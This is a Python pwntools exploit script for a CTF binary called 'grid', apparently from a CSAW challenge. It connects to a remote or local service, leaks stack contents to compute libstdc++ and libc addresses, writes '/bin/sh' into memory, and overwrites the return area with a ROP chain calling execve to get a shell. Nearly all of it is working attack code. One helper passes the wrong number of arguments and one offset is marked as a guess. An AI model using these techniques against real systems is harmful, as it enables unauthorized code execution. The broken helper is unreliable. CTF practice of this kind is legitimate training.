#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./grid"
LIBCNAME = "./libc-2.27.so"

hosts = ("pwn.chal.csaw.io","localhost","localhost")
ports = (5013,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  pass

def pl(x,y,v):
  c.recvuntil("shape> ")
  c.sendline(str(v))
  c.recvuntil("loc> ")
  c.sendline(str(x))
  c.sendline(str(y))

def display():
  c.recvuntil("shape> ")
  c.sendline("d")
  c.recvuntil("Displaying\n")

def overwrite_RA(addr, offset):
  global c
  abytes = b""
  for i in range(8):
    if addr>>(i*8) == 0:
      abytes += p8(0x00)
    else:
      abytes += p8(addr>>(i*8) & 0xff)

  print("[+] overwriting as :{}".format(hex(addr)))
  for i in range(8):
    print("  writing {} th: {}".format(hex(i), hex(u8(abytes[i]))))
    pl(0, 0x78+i, offset, abytes[i])

def overwrite_some(pay, off=0x78):
  global c
  print("[+] overwriting")
  for i in range(len(pay)):
    print("  writing {} th".format(hex(i)))
    pl(0, off+i, pay[i])

## exploit ###########################################

def exploit():
  global c

  display()
  leak = b""
  for i in range(10):
    leak += c.recv(10)
    c.recv(1)

  nleak = []
  for i in range(100//8):
    nleak += [unpack(leak[i*8:(i+1)*8])]

  for i in range(len(nleak)):
    print("{}".format(hex(nleak[i])))

  libstdcbase = nleak[3] - 0xfb5da
  print("[+] libstdcbase: {}".format(hex(libstdcbase)))

  libcbase = libstdcbase + 0x389000 #??
  print("[+] libcbase: {}".format(hex(libcbase)))
  targetstack = nleak[4] - 0x1c0 + 0x20
  print("[+] targetstack: {}".format(hex(targetstack)))

  overwrite_some("/bin/sh\x00", 0x10)

  ogs = [0x4f365, 0x4f3c2, 0x10a45c]
  pop_rax = 0x484c + libstdcbase
  pop_rdi = 0x8fedc + libstdcbase
  pop_rsi = 0xbc50 + libstdcbase
  pop_rdx = 0x57cd + libstdcbase
  syscall = 0x1904 + libstdcbase
  pay = b""
  pay += p64(pop_rax)
  pay += p64(0x3b)
  pay += p64(pop_rdi)
  pay += p64(targetstack)
  pay += p64(pop_rsi)
  pay += p64(0)
  pay += p64(pop_rdx)
  pay += p64(0)
  pay += p64(syscall)
  overwrite_some(pay)

  display()


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
